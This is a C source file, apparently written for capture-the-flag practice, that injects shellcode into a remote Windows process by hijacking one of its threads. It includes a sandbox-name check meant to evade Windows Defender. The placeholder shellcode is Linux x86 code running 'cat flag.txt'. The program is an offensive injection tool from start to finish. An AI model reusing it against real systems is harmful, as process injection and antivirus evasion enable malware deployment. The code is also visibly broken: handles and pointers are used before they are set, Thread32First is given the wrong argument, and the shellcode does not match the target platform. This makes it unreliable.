#include <stdio.h>

#include <Windows.h>

#include <TlHelp32.h>


//not the most experienced with how windows program memory works, so experimenting with using thread hijacking to inject shellcode into a remote process
//probably would get detected by AV but not all CTFs have AVs on the VM
//adapted from this very good article: https://www.ired.team/offensive-security/code-injection-process-injection/thread-hijacking-and-shellcode-injection





int main(int argc, char * argv[]) {

  //Windows defender uses HAL9TH for the name of the computer in the sandbox. Supposedly this works but I kind of doubt windows av is that stupid

  LPWSTR computerName;
  TCHAR name[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
  GetComputerName(computerName, & size);
  if (wcscmp(computerName, L"HAL9TH") == 0) {
    return 0;
  }

  //using cat flag.txt as a placeholder
  char shellcode[] = "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80";

  DWORD pid = atoi(argv[1]);
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  PVOID buffer;
  HANDLE hThread;
  DWORD dwThreadId;
  LPVOID lpBaseAddress;
  THREADENTRY32 te32;
  CONTEXT ctx;

  ctx = {
    CONTEXT_FULL
  }; //set the context to full 
  GetThreadContext(hThread, & ctx); //get the context of the thread

  //allocate memory in the remote process
  buffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (buffer == NULL) {
    printf("VirtualAllocEx failed: %d\n", GetLastError());
    return 1;
  }

  //write the shellcode to the remote process
  WriteProcessMemory(hProcess, buffer, shellcode, sizeof(shellcode), NULL);
  Thread32First(hThread, & te32);
  do {
    if (te32.th32OwnerProcessID == pid) {
      hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
      if (hThread == NULL) {
        printf("OpenThread failed: %d\n", GetLastError());
        return 1;
      }
      break;
    }
  } while (Thread32Next(hThread, & te32));

  //set the base address of the thread to the address of the shellcode
  ctx.ContextFlags = CONTEXT_FULL;
  SuspendThread(hThread);
  ctx.Rip = (DWORD) buffer;
  SetThreadContext(hThread, & ctx);
  ResumeThread(hThread);
  return 0;

}